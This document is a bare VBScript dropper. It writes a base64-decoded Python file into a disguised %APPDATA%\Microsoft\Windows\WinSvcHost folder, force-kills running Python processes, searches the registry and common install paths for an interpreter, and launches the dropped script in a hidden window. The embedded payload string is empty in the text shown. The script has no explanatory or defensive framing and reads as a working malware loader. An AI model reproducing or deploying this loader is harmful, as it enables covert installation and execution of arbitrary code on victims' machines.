Set fso=CreateObject("Scripting.FileSystemObject")
Set sh=CreateObject("WScript.Shell")
appdata=sh.ExpandEnvironmentStrings("%APPDATA%")
dest=appdata&"\Microsoft\Windows\WinSvcHost"
If Not fso.FolderExists(dest) Then fso.CreateFolder(dest)
pyfile=dest&"\WinSvcHost.py"

b64=""
Set objXML=CreateObject("MSXML2.DOMDocument")
Set objNode=objXML.createElement("b64")
objNode.dataType="bin.base64"
objNode.text=b64
Set objStream=CreateObject("ADODB.Stream")
objStream.Type=1
objStream.Open
objStream.Write objNode.nodeTypedValue
objStream.SaveToFile pyfile,2
objStream.Close

sh.Run "taskkill /F /IM pythonw.exe /T",0,False
sh.Run "taskkill /F /IM python.exe /T",0,False
WScript.Sleep 1500

pyPath=""
On Error Resume Next
If pyPath="" Then pyPath=sh.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Python\PythonCore\3.12\InstallPath\")
If pyPath="" Then pyPath=sh.RegRead("HKEY_CURRENT_USER\SOFTWARE\Python\PythonCore\3.12\InstallPath\")
If pyPath="" Then pyPath=sh.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Python\PythonCore\3.12\InstallPath\")
If pyPath="" Then pyPath=sh.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Python\PythonCore\3.11\InstallPath\")
If pyPath="" Then pyPath=sh.RegRead("HKEY_CURRENT_USER\SOFTWARE\Python\PythonCore\3.11\InstallPath\")
If pyPath="" Then pyPath=sh.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Python\PythonCore\3.11\InstallPath\")
If pyPath="" Then pyPath=sh.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Python\PythonCore\3.10\InstallPath\")
If pyPath="" Then pyPath=sh.RegRead("HKEY_CURRENT_USER\SOFTWARE\Python\PythonCore\3.10\InstallPath\")
If pyPath="" Then pyPath=sh.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Python\PythonCore\3.10\InstallPath\")
If pyPath="" Then pyPath=sh.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Python\PythonCore\3.9\InstallPath\")
If pyPath="" Then pyPath=sh.RegRead("HKEY_CURRENT_USER\SOFTWARE\Python\PythonCore\3.9\InstallPath\")
If pyPath="" Then pyPath=sh.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Python\PythonCore\3.9\InstallPath\")
If pyPath="" Then pyPath=sh.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Python\PythonCore\3.8\InstallPath\")
If pyPath="" Then pyPath=sh.RegRead("HKEY_CURRENT_USER\SOFTWARE\Python\PythonCore\3.8\InstallPath\")
If pyPath="" Then pyPath=sh.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Python\PythonCore\3.8\InstallPath\")
If pyPath="" Then pyPath=sh.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Python\PythonCore\3\InstallPath\")
If pyPath="" Then pyPath=sh.RegRead("HKEY_CURRENT_USER\SOFTWARE\Python\PythonCore\3\InstallPath\")
If pyPath="" Then pyPath=sh.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Python\PythonCore\3\InstallPath\")
If pyPath="" Then pyPath=sh.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Python\PythonCore\3.13\InstallPath\")
If pyPath="" Then pyPath=sh.RegRead("HKEY_CURRENT_USER\SOFTWARE\Python\PythonCore\3.13\InstallPath\")
If pyPath="" Then pyPath=sh.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Python\PythonCore\3.13\InstallPath\")
Dim u: u=sh.ExpandEnvironmentStrings("%USERPROFILE%")
Dim paths(10)
paths(0)=u&"\AppData\Local\Programs\Python\Python312\"
paths(1)=u&"\AppData\Local\Programs\Python\Python311\"
paths(2)=u&"\AppData\Local\Programs\Python\Python310\"
paths(3)=u&"\AppData\Local\Programs\Python\Python39\"
paths(4)=u&"\anaconda3\"
paths(5)=u&"\miniconda3\"
paths(6)="C:\anaconda3\"
paths(7)="C:\ProgramData\Anaconda3\"
paths(8)="C:\ProgramData\miniconda3\"
paths(9)="C:\Python312\"
paths(10)="C:\Python311\"
Dim i
For i=0 To 10
    If pyPath="" Then
        If fso.FileExists(paths(i)&"pythonw.exe") Then pyPath=paths(i)
    End If
Next
On Error GoTo 0

If pyPath<>"" Then
    Dim exe
    exe=pyPath&"pythonw.exe"
    If Not fso.FileExists(exe) Then exe=pyPath&"python.exe"
    If fso.FileExists(exe) Then
        sh.Run Chr(34)&exe&Chr(34)&" "&Chr(34)&pyfile&Chr(34),0,False
    End If
End If
